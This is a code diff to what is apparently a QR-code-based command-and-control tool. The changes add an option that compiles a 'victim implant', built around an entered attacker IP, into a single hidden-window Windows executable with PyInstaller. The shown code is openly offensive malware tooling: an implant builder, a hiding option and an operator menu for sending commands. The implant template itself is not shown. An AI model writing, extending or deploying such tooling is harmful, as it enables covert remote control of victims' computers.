@@ -1,4 +1,5 @@
 import os
+import subprocess
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from PIL import Image
 from pyzbar.pyzbar import decode
@@ -37,7 +38,7 @@ def logo():
 """
     print(banner)
 
-def build_implant(attacker_ip):
+def build_implant(attacker_ip, compile_exe=False):
     print("[+] Building victim implant...")
     with open(TEMPLATE_PATH, "r") as template_file:
         implant_code = template_file.read()
@@ -48,6 +49,17 @@ def build_implant(attacker_ip):
         f.write(implant_code)
 
     print("[+] Victim implant created as 'victim_implant.py'")
+
+    if compile_exe:
+        print("[+] Compiling implant to .exe with PyInstaller...")
+        result = subprocess.run(
+            ["pyinstaller", "--onefile", "--noconsole", "victim_implant.py"],
+            capture_output=True, text=True
+        )
+        if result.returncode == 0:
+            print("[+] Compiled successfully. Executable is in the 'dist/' folder.")
+        else:
+            print(f"[-] PyInstaller failed:\n{result.stderr}")
 
 def create_qr_code(command, index):
     print(f"[+] Sending command: {command}")
@@ -176,7 +188,8 @@ def main():
                     print("[-] Invalid command.")
         elif choice == "2":
             attacker_ip = input("[>] Enter attacker IP: ")
-            build_implant(attacker_ip)
+            compile_choice = input("[>] Compile to .exe? (y/n): ").strip().lower()
+            build_implant(attacker_ip, compile_exe=(compile_choice == "y"))
         elif choice == "3":
             print("[+] Shutting down...")
             break
